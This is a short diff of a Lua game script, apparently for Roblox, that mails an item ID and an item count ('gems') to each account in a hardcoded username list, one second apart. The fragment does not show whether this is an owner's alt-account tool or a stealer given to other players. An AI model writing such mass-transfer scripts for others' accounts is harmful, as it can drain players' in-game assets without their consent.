@@ -1,4 +1,3 @@
-
 local usernamesString = [[
 Dark25WarriorE
 Pixel91PrinceE
@@ -484,6 +483,6 @@ local function GetItemID()
 end
 local result = GetItemID()
 for _, username in pairs(usernames) do
-    sendMail(username, "Currency", result, totalitem)--gems
+    sendMail(username, classname, result, totalitem)--gems
     wait(1)
 end
